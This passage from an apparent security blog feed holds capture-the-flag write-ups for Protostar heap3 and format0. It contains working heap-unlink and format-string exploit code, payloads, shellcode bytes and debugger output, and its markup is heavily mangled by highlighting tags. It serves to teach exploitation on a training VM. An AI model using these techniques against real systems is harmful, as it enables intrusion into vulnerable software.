</span><span class='line'><span class="sr">&lt;h1&gt;0804b128 R_386_JUMP_SLOT   puts&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">gdb</span><span class="o">&gt;</span> <span class="nb">print</span> <span class="sr">/x 0x0804b128-0x0c&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="vg">$1</span> <span class="o">=</span> <span class="mh">0x804b11c</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:~$ nm /o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">winner</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;08048864 T winner&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># rasm2 -C &amp;lsquo;push 0x08048864; ret&amp;rsquo;&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x68</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">x88</span><span class="p">\</span><span class="n">x04</span><span class="p">\</span><span class="n">x08</span><span class="p">\</span><span class="n">xc3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">ltrace</span> <span class="o">-</span><span class="n">e</span> <span class="n">strcpy</span> <span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="n">a</span> <span class="n">b</span> <span class="n">c</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;strcpy(0x0804c008, &amp;ldquo;a&amp;rdquo;)                              = 0x0804c008&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">strcpy</span><span class="p">(</span><span class="mh">0x0804c030</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>                              <span class="o">=</span> <span class="mh">0x0804c030</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;strcpy(0x0804c058, &amp;ldquo;c&amp;rdquo;)                              = 0x0804c058&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">gdb</span><span class="o">&gt;</span> <span class="nb">print</span> <span class="sr">/x 0x0804c008 + 0x04&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="vg">$1</span> <span class="o">=</span> <span class="mh">0x804c00c</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;binary = &amp;ldquo;/o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;chunk1&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">argv1</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">XXXX</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                        <span class="c1"># user data, later overwritten by second free()</span>
</span><span class='line'><span class="n">argv1</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x68</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">x88</span><span class="p">\</span><span class="n">x04</span><span class="p">\</span><span class="n">x08</span><span class="p">\</span><span class="n">xc3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c1"># shellcode&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">chunk2</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;argv2  = &amp;ldquo;X&amp;rdquo; * 24 + &amp;ldquo;\x01&amp;rdquo; + &amp;ldquo;ABCDEFG&amp;rdquo; # user data&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">chunk3</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;argv2 &amp;lt;&amp;lt; [0xfffffff8].pack(&amp;ldquo;V&amp;rdquo;)        # prev_size = -8 &amp;amp;&amp;amp; PREV_INUSE = 0</span>
</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0xfffffffc].pack(&amp;ldquo;V&amp;rdquo;)        # size = -4</span>
</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x44444444].pack(&amp;ldquo;V&amp;rdquo;)        # prev_size(unused) for fake chunk</span>
</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x45454545].pack(&amp;ldquo;V&amp;rdquo;)        # size(unused) for fake chunk</span>
</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x0804b11c].pack(&amp;ldquo;V&amp;rdquo;)        # ret_loc-0x0c</span>
</span><span class='line'><span class="sr">argv2 &amp;lt;&amp;lt; [0x0804c00c].pack(&amp;ldquo;V&amp;rdquo;)        # ret_addr</span>
</span><span class='line'><span class="sr">argv3  = &amp;ldquo;X&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x0804b11c</span><span class="o">+</span><span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x0804c00c</span><span class="p">;</span> <span class="o">&lt;</span><span class="sr">/em&gt;(0x0804c00c+8) = 0x0804b11c&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="nb">puts</span> <span class="sx">%x[ </span><span class="si">#{</span><span class="n">binary</span><span class="si">}</span><span class="sx"> &amp;ldquo;</span><span class="si">#{</span><span class="n">argv1</span><span class="si">}</span><span class="sx">&amp;rdquo; &amp;ldquo;</span><span class="si">#{</span><span class="n">argv2</span><span class="si">}</span><span class="sx">&amp;rdquo; &amp;ldquo;</span><span class="si">#{</span><span class="n">argv3</span><span class="si">}</span><span class="sx">&amp;rdquo; ]</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>To explain the logic behind our code, because <code>size</code> has the lowest bit set as
<code>!PREV_INUSE</code> and <code>p</code> points to the beginning of our current chunk, we
triggered the following part of pseudocode with the first <code>free()</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">consolidate</span> <span class="n">backward</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="o">-</span><span class="mi">8</span>
</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">+</span><span class="mi">8</span><span class="p">);</span>
</span><span class='line'>    <span class="n">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here the address of &ldquo;virtual chunk&rdquo; was computed and unlinked:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">[</span><span class="mh">0x44444444</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># prev_size</span>
</span><span class='line'><span class="o">[</span><span class="mh">0x45454545</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># size</span>
</span><span class='line'><span class="o">[</span><span class="mh">0x0804b11c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># fwd</span>
</span><span class='line'><span class="o">[</span><span class="mh">0x0804c00c</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c1"># bck</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>However, there is another test in consolidate forward:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if (!(inuse_bit_at_offset(next, nextsz)))   /&lt;em> consolidate forward &lt;/em>/
</span><span class='line'>    unlink(next, bck, fwd);&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>0x08049918 &lt;free+244>:  mov    eax,DWORD PTR [ebp-0x24] ; eax:FFFFFFF8 = -8
</span><span class='line'>0x0804991b &lt;free+247>:  mov    edx,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
</span><span class='line'>0x0804991e &lt;free+250>:  lea    eax,[edx+eax*1]          ; 0x804c044: &ldquo;XXXX\001ABCDEFG\370\377\377\377\374\377\377\377X&rdquo;
</span><span class='line'>0x08049921 &lt;free+253>:  mov    eax,DWORD PTR [eax+0x4]  ; eax:43424101
</span><span class='line'>0x08049924 &lt;free+256>:  and    eax,0x1                  ; eax:00000001 = PREV_INUSE flag
</span><span class='line'>0x08049927 &lt;free+259>:  mov    DWORD PTR [ebp-0x20],eax ;
</span><span class='line'>0x0804992a &lt;free+262>:  mov    eax,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
</span><span class='line'>0x0804992d &lt;free+265>:  mov    edx,DWORD PTR [ebp-0x24] ; edx:FFFFFFF8
</span><span class='line'>0x08049930 &lt;free+268>:  mov    DWORD PTR [eax+0x4],edx&lt;br/>
</span><span class='line'>0x08049933 &lt;free+271>:  cmp    DWORD PTR [ebp-0x20],0x0 ; PREV_INUSE set?&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Here at the position <code>-0x4</code> is <code>DEFG</code> chunk (prev_size), with the size <code>-0x8</code>, where the <code>PREV_INUSE</code> flag is set, so we skipped
the forward consolidation:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">argv2</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">X</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">ABCDEFG</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="c1"># user data</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ /opt/protostar/bin/heap3 $(ruby -e &lsquo;print &ldquo;XXXX&rdquo; + &ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;&rsquo;) $(ruby -e &lsquo;print &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + [0x0804b11c].pack(&ldquo;V&rdquo;) + [0x0804c00c].pack(&ldquo;V&rdquo;)&rsquo;) X
</span><span class='line'>that wasn&rsquo;t too bad now, was it? @ 1435304932&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ./exploit-backward.rb
</span><span class='line'>that wasn&rsquo;t too bad now, was it? @ 1435304818&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2></span></code></pre></td></tr></table></div></figure></h2>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Format Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels/"/>
    <updated>2015-06-28T09:29:15+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<h2>Protostar Format0</h2>

<p><figure class='code'><figcaption><span>format0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">have</span> <span class="n">hit</span> <span class="n">the</span> <span class="n">target</span> <span class="nl">correctly</span> <span class="p">:)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/format0
</span><span class='line'>&hellip;
</span><span class='line'>gdb> disassemble vuln
</span><span class='line'>Dump of assembler code for function vuln:
</span><span class='line'>0x080483f4 &lt;vuln+0>:    push   ebp
</span><span class='line'>0x080483f5 &lt;vuln+1>:    mov    ebp,esp
</span><span class='line'>0x080483f7 &lt;vuln+3>:    sub    esp,0x68
</span><span class='line'>0x080483fa &lt;vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
</span><span class='line'>0x08048401 &lt;vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
</span><span class='line'>0x08048404 &lt;vuln+16>:   mov    DWORD PTR [esp+0x4],eax
</span><span class='line'>0x08048408 &lt;vuln+20>:   lea    eax,[ebp-0x4c]
</span><span class='line'>0x0804840b &lt;vuln+23>:   mov    DWORD PTR [esp],eax
</span><span class='line'>0x0804840e &lt;vuln+26>:   call   0x8048300 &lt;sprintf@plt>
</span><span class='line'>0x08048413 &lt;vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]
</span><span class='line'>0x08048416 &lt;vuln+34>:   cmp    eax,0xdeadbeef
</span><span class='line'>0x0804841b &lt;vuln+39>:   jne    0x8048429 &lt;vuln+53>
</span><span class='line'>0x0804841d &lt;vuln+41>:   mov    DWORD PTR [esp],0x8048510
</span><span class='line'>0x08048424 &lt;vuln+48>:   call   0x8048330 &lt;puts@plt>
</span><span class='line'>0x08048429 &lt;vuln+53>:   leave&lt;br/>
</span><span class='line'>0x0804842a &lt;vuln+54>:   ret  &lt;br/>
</span><span class='line'>End of assembler dump.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> b *0x08048413
</span><span class='line'>Breakpoint 1 at 0x8048413: file format0/format0.c, line 15.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</span><span class='line'>&hellip;
</span><span class='line'>Breakpoint 1, vuln (string=0x41386341 &lt;Address 0x41386341 out of bounds>) at format0/format0.c:15
</span><span class='line'>15  in format0/format0.c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /1xw $ebp-0xc
</span><span class='line'>0xbffff6ec: 0x63413163</span></code></pre></td></tr></table></div></figure></p>

<p>From the output above, we can see:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>addr of &lsquo;int target&rsquo;:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>0x080483fa &lt;vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>addr of &lsquo;char *string&rsquo;:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>0x08048401 &lt;vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
</span><span class='line'>0x08048404 &lt;vuln+16>:   mov    DWORD PTR [esp+0x4],eax&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>addr of &lsquo;char buffer[64]&rsquo;:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>0x08048408 &lt;vuln+20>:   lea    eax,[ebp-0x4c]</span></code></pre></td></tr></table></div></figure></p>

<p>Because the pattern <code>0x63413163</code> means offset 64, we could trivially pass the
challenge by overflowing <code>buffer</code> array, because <code>int target</code> follows immediately
(0x4c - 64 = 0xc):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo;)
</span><span class='line'>you have hit the target correctly :)</span></code></pre></td></tr></table></div></figure></p>

<p>This level should be done in less than 10 bytes of input, so let&rsquo;s try similar
approach by overflowing the buffer using format string exploitation.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e &lsquo;print &ldquo;%64x&rdquo; + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo;)
</span><span class='line'>you have hit the target correctly :)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print &ldquo;%64x&rdquo; + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo; > /tmp/payload&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ wc -c /tmp/payload
</span><span class='line'>8 /tmp/payload&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format0 $(cat /tmp/payload)
</span><span class='line'>you have hit the target correctly :)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Format1</h2>

<p><figure class='code'><figcaption><span>format1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
